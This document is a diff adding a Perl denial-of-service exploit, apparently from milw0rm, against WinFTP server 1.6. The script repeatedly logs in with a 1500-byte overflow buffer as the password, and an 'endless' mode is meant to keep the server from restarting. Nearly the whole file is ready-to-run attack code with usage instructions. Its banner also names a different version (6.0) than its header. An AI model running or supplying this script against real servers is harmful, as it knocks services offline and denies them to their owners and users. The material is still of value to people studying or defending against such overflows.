@@ -1,0 +1,79 @@
+#!/usr/local/bin/perl -w
+
+###########################################################
+###########################################################
+##     WinFTP server ver  1.6  D.o.S Exploit
+##         Discovered,exploited by KaGra
+##	Tested on WinXP SP1 English version
+## 
+## Sending 40 times a username and a buffer of 1500
+## bytes as pass,will crash the server,as soon as is
+## not minimized in Target computer.If he is minimized,he
+## will crash as soon as he will stop be minimized.If U use
+## this sploit in a loop without ending,server will be unable
+## to restart,because he starts NOT minimized of course... 
+## Except USER and PASS,almost all commands of ftp service are vuln...
+############################################################
+############################################################
+
+
+use Net::FTP;
+
+if(@ARGV<2)  
+{
+ print "#################  Winftp 6.0 D.o.S SploiT By KaGra  ###################\n";
+ print "#               Usage: perl agate.pl <target> <option>                 #\n";  
+ print "#   Option is 1 for non endless D.o.s,2 for endless D.o.s,use 1 first  #\n";
+ print "########################################################################\n\n";
+ exit(0);
+}
+
+$hostname = $ARGV[0]; 		        #Remote Host to D.o.S!
+$username = 'kagra'; 		        #AnythinG HeRe!
+
+print "\n[*]BuiLDinG BuFfer...\n";
+
+$password = 'A'x1500   ; 		#OverFlow BuffEr!
+print "[*]ConnectinG To TarGet...\n";
+
+
+
+
+if($ARGV[1]==2)
+{
+print "[*]SenDing DeViL In EndLeSS Loop,Server Will be DEAD for eVer,just stop the process...\n";
+for($i=0; $i < 20; $i--)
+{
+XX:
+$ftp = Net::FTP->new($hostname);        # Connecting...
+if(!defined($ftp))
+{
+goto XX
+}
+$ftp->login($username, $password);      # Sending EviL BuffeR...
+$ftp->quit;
+}
+exit(0);
+}
+
+
+
+
+
+for($i= 0; $i < 40; $i++)
+{
+$ftp = Net::FTP->new($hostname);        # Connecting...
+if(!defined($ftp))
+{
+	print "Could not connect.If buffer has been send,then target D.o.Sed :-P.Use sploit in endless loop now,and will not restart again...\n";
+	sleep(1);
+	exit(0);
+}
+print "[*]SenDing DeViL...\n";
+$ftp->login($username, $password);      # Sending EviL BuffeR...
+$ftp->quit;
+}
+print "SerVer Has Been D.o.sed,will be Down if he is or will be stop being minimized!Use sploit in endless loop now,and when he will be down,will not restart again...\n";
+
+
+# milw0rm.com [2004-11-11]
